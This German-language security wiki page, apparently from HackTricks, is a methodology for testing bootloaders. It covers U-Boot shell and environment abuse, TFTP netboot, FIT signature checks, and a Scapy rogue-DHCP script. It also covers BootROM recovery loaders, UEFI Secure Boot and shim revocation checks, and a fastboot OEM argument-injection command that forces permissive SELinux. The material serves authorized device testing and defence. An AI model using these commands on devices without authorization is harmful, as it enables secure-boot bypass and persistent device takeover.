# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Gerätestartkonfigurationen zu ändern und Bootloader wie U-Boot und UEFI-Klassenloader zu testen. Konzentriere dich darauf, frühzeitig Codeausführung zu erreichen, Signatur-/Rollback-Schutzmechanismen zu bewerten und Recovery- oder Network-Boot-Pfade auszunutzen.

Verwandt: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Schnelle Erfolge bei U-Boot und Missbrauch der Umgebung

1. Auf die Interpreter-Shell zugreifen
- Drücke während des Bootvorgangs eine bekannte Unterbrechungstaste (häufig eine beliebige Taste, 0, die Leertaste oder eine boardspezifische „magic“-Sequenz), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.<sup>[[1]](#references)</sup>

2. Bootstatus und Variablen untersuchen
- Nützliche Befehle:
- `printenv` (Umgebung ausgeben)
- `bdinfo` (Boardinformationen, Speicheradressen)
- `help bootm; help booti; help bootz` (unterstützte Kernel-Bootmethoden)
- `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Bootargumente ändern, um eine Root-Shell zu erhalten
- Hänge `init=/bin/sh` an, damit der Kernel anstelle des normalen init-Prozesses eine Shell startet:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot von deinem TFTP-Server
- Konfiguriere das Netzwerk und lade ein Kernel-/FIT-Image aus dem LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Änderungen über die Umgebung persistent machen
- Wenn der Umgebungsspeicher nicht schreibgeschützt ist, kannst du die Steuerung persistent machen:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd` und `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Unterbrechungen zur Shell ermöglichen.

6. Debug-/unsichere Funktionen prüfen
- Suche nach: `bootdelay` > 0, deaktiviertem `autoboot`, uneingeschränktem `usb start; fatload usb 0:1 ...`, der Möglichkeit, über die serielle Schnittstelle `loady`/`loads` zu verwenden, `env import` von nicht vertrauenswürdigen Medien sowie Kerneln/Ramdisks, die ohne Signaturprüfungen geladen werden.

7. U-Boot-Image-/Verifikationstests
- Wenn die Plattform Secure/Verified Boot mit FIT-Images angibt, teste sowohl unsignierte als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder ein Verhalten nach dem Muster `verify=n` bei Legacy-Images ermöglicht häufig das Booten beliebiger Payloads.
- Beschränke dich nicht auf ein einfaches Allow-/Deny-Ergebnis: Aktuelle FIT-Forschung hat gezeigt, dass der Verifikationspfad selbst eine Pre-Auth-Angriffsfläche sein kann. Führe negative Tests mit extern gespeicherten FIT-Daten (`data-offset`, `data-position`, `data-size`), signierter Konfigurationsauswahl, `loadables` sowie der Verarbeitung von Overlay / `extra-conf` durch.
- Wenn du über einen passenden Source Tree verfügst, ist `test/vboot/vboot_test.sh` eine schnelle Möglichkeit, das FIT-Verifikationsverhalten in der U-Boot-Sandbox zu reproduzieren, bevor echte Hardware verwendet wird.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` und Script-Bootflows
- Bei modernen U-Boot-Builds ist `bootcmd` häufig nur ein Wrapper um Standard Boot. Dadurch können beschreibbare Medien, PXE oder SPI-Flash die tatsächliche Trust Boundary bilden, selbst wenn die sichtbare Umgebung harmlos aussieht.
- Die `extlinux`-Bootmeth durchsucht `/` und `/boot` nach `extlinux/extlinux.conf`; die Script-Bootmeth sucht zuerst nach `boot.scr.uimg` und anschließend nach `boot.scr`. Beim Network Boot kann der Script-Dateiname aus `boot_script_dhcp` stammen.
- Nützliche Triage-Befehle:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Zu testende Missbrauchsfälle: vom Angreifer kontrollierte USB-/SD-Medien an einer früheren Position in `boot_targets`, beschreibbares `/boot/extlinux/extlinux.conf`, ein Rogue-TFTP-Server, der `boot.scr` liefert, oder die Ausführung von Scripts über SPI mit `script_offset_f`.
- Wenn die Plattform auf FIT-Verifikation setzt, stelle sicher, dass Konfigurationen auf Konfigurationsebene signiert sind und nicht nur pro Image; `required-mode=all` ist stärker als die Akzeptanz eines einzelnen erforderlichen Schlüssels.

## Network-Boot-Angriffsfläche (DHCP/PXE) und Rogue-Server

9. Fuzzing von PXE-/DHCP-Parametern
- Die Legacy-BOOTP-/DHCP-Verarbeitung von U-Boot hatte bereits Memory-Safety-Probleme. CVE-2024-42040 beschreibt beispielsweise eine Memory Disclosure durch manipulierte DHCP-Antworten, die Bytes aus dem U-Boot-Speicher zurück über das Netzwerk leaken kann.<sup>[[4]](#references)</sup> Teste die DHCP-/PXE-Codepfade mit überlangen Werten und Grenzfällen (Option 67 `bootfile-name`, Vendor-Optionen sowie `file`-/`servername`-Felder) und achte auf Hänger/Leaks.
- Minimales Scapy-Snippet zum Belastungstest der Bootparameter während des Netboots:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe außerdem, ob PXE-Dateinamenfelder ohne ausreichende Bereinigung an Shell-/Loader-Logik übergeben werden, wenn sie mit OS-seitigen Provisioning-Scripts verkettet sind.

10. Testen von Command Injection über einen Rogue-DHCP-Server
- Richte einen Rogue-DHCP-/PXE-Service ein und versuche, Zeichen in Dateinamen- oder Optionsfeldern einzuschleusen, um in späteren Phasen der Bootkette Kommandointerpreter zu erreichen. Metasploits DHCP-Auxiliary, `dnsmasq` oder benutzerdefinierte Scapy-Scripts eignen sich gut dafür. Isoliere zuerst das Labornetzwerk.

## SoC-ROM-Recovery-Modi, die den normalen Bootvorgang überschreiben

Viele SoCs stellen einen BootROM-„Loader“-Modus bereit, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn Secure-Boot-Fuses nicht gesetzt sind, kann dies sehr früh in der Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
- Beispiel: `imx-usb-loader u-boot.imx`, um einen benutzerdefinierten U-Boot aus dem RAM zu laden und auszuführen.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader bereitzustellen und einen benutzerdefinierten U-Boot hochzuladen.

Prüfe, ob Secure-Boot-eFuses/OTP des Geräts gesetzt wurden. Falls nicht, umgehen BootROM-Downloadmodi häufig jede Verifikation auf höheren Ebenen (U-Boot, Kernel, Rootfs), indem sie deine First-Stage-Payload direkt aus SRAM/DRAM ausführen.

## UEFI-/PC-Klassenloader: schnelle Prüfungen

11. ESP-Manipulation, Rollback- und Key-Enrollment-Tests
- Hänge die EFI System Partition (ESP) ein und prüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` sowie Pfade zu Herstellerlogos.
- Gib den Secure-Boot-Status und die Schlüsseldatenbanken möglichst aus dem OS aus:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Wenn sich die Plattform im Setup Mode befindet, nicht authentifiziertes Key Enrollment akzeptiert oder mit einem Test-/Default-Platform-Key (PKfail-Klasse) ausgeliefert wird, kann ein lokaler Administrator oder physischer Angreifer einen eigenen KEK/db registrieren und Secure Boot scheinbar „aktiviert“ lassen, während beliebige EFI-Binaries gebootet werden.<sup>[[3]](#references)</sup>
- Versuche, mit älteren oder bekanntermaßen verwundbaren signierten Bootkomponenten zu booten, wenn die Secure-Boot-Widerrufe (dbx) nicht aktuell sind. Wenn die Plattform alte Shims/Bootmanager weiterhin vertraut, kannst du häufig deinen eigenen Kernel oder eine eigene `grub.cfg` von der ESP laden und Persistenz erlangen.

12. Tests auf veraltete Shim-/SBAT-/dbx-Widerrufe
- Alte von Microsoft signierte Shims und Forks von Herstellern können weiterhin als BYOVD-ähnlicher Bootkit-Pfad dienen, wenn Widerrufe veraltet sind. Platziere in einem isolierten Lab einen historisch verwundbaren Shim auf der ESP und versuche, deine eigene `grubx64.efi` oder deinen eigenen Kernel per Chainload zu starten.<sup>[[11]](#references)</sup>
- Schnelle Triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Wenn der Shim trotz Eintrags in der Widerrufsliste weiterhin ausgeführt wird, verfügt die Firmware/das OS über veraltete `dbx`-Updates oder vertraut einem geforkten Loader, der die SBAT-Schutzmaßnahmen des Upstream-Projekts nie übernommen hat.

13. Fehler beim Parsen von Bootlogos (LogoFAIL-Klasse)
- Mehrere OEM-/IBV-Firmwares waren anfällig für Image-Parsing-Fehler in DXE, die Bootlogos verarbeiten. Wenn ein Angreifer ein manipuliertes Image auf der ESP unter einem herstellerspezifischen Pfad platzieren kann (z. B. `\EFI\<vendor>\logo\*.bmp`) und das Gerät neu gestartet wird, kann bereits während des frühen Bootvorgangs Codeausführung möglich sein, selbst wenn Secure Boot aktiviert ist. Teste, ob die Plattform benutzerbereitgestellte Logos akzeptiert und ob diese Pfade aus dem OS heraus beschreibbar sind.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16): Trust Gaps

Bei Android-16-Geräten, die Qualcomms ABL zum Laden der **Generic Bootloader Library (GBL)** verwenden, muss geprüft werden, ob ABL die aus der `efisp`-Partition geladene UEFI-App **authentifiziert**. Wenn ABL lediglich prüft, ob eine UEFI-App **vorhanden** ist, und keine Signaturen verifiziert, wird ein Write Primitive auf `efisp` zu **unsignierter Codeausführung vor dem OS-Start** während des Bootvorgangs.<sup>[[6]](#references)[[7]](#references)</sup>

Praktische Prüfungen und Missbrauchspfade:

- **efisp write primitive**: Du benötigst eine Möglichkeit, eine benutzerdefinierte UEFI-App in `efisp` zu schreiben (Root/privilegierter Service, OEM-App-Bug, Recovery-/Fastboot-Pfad). Ohne diese Möglichkeit ist die GBL-Lücke nicht direkt erreichbar.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL-Bug): Einige Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen sie an die Kernel-Cmdline an. Dies kann verwendet werden, um permissives SELinux zu erzwingen und dadurch Schreibzugriff auf geschützte Partitionen zu ermöglichen:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente zurückweisen.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock via persistent flags**: Eine Payload in der Bootphase kann persistente Unlock-Flags (z. B. `is_unlocked=1`, `is_unlocked_critical=1`) setzen, um `fastboot oem unlock` ohne OEM-Server-/Freigabekontrollen nachzuahmen. Dies ändert die Sicherheitslage dauerhaft nach dem nächsten Neustart.<sup>[[6]](#references)</sup>

Hinweise zur Abwehr/Triage:

- Bestätige, ob ABL eine Signaturverifikation der GBL-/UEFI-Payload aus `efisp` durchführt. Falls nicht, behandle `efisp` als Persistence Surface mit hohem Risiko.
- Prüfe, ob die Fastboot-OEM-Handler von ABL gepatcht wurden, um **die Anzahl der Argumente zu validieren** und zusätzliche Tokens zurückzuweisen.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware-Hinweis

Gehe beim Zugriff auf SPI-/NAND-Flash während der frühen Bootphase vorsichtig vor (z. B. beim Erden von Pins zur Umgehung von Lesevorgängen) und konsultiere immer das Datenblatt des Flash-Bausteins. Nicht korrekt getimte Kurzschlüsse können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Versuche `env export -t ${loadaddr}` und `env import -t ${loadaddr}`, um Umgebungsblobs zwischen RAM und Speicher zu übertragen; manche Plattformen erlauben den Import von Umgebungsdaten von Wechseldatenträgern ohne Authentifizierung.
- Bei Linux-basierten Systemen, die über `extlinux.conf` booten, reicht es häufig aus, die Zeile `APPEND` auf der Bootpartition zu ändern (um `init=/bin/sh` oder `rd.break` einzuschleusen), wenn keine Signaturprüfungen erzwungen werden.
- Wenn das Ziel Dual-Slot-/A/B-Updates verwendet, prüfe die Anti-Rollback- und Slot-Desync-Techniken in der [firmware analysis overview](README.md), damit keine Updater-only Trust Gaps außerhalb des Bootloaders übersehen werden.
- Wenn Userland `fw_printenv/fw_setenv` bereitstellt, validiere, dass `/etc/fw_env.config` dem tatsächlichen Speicherort der Umgebung entspricht. Falsch konfigurierte Offsets ermöglichen das Lesen/Schreiben der falschen MTD-Region.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
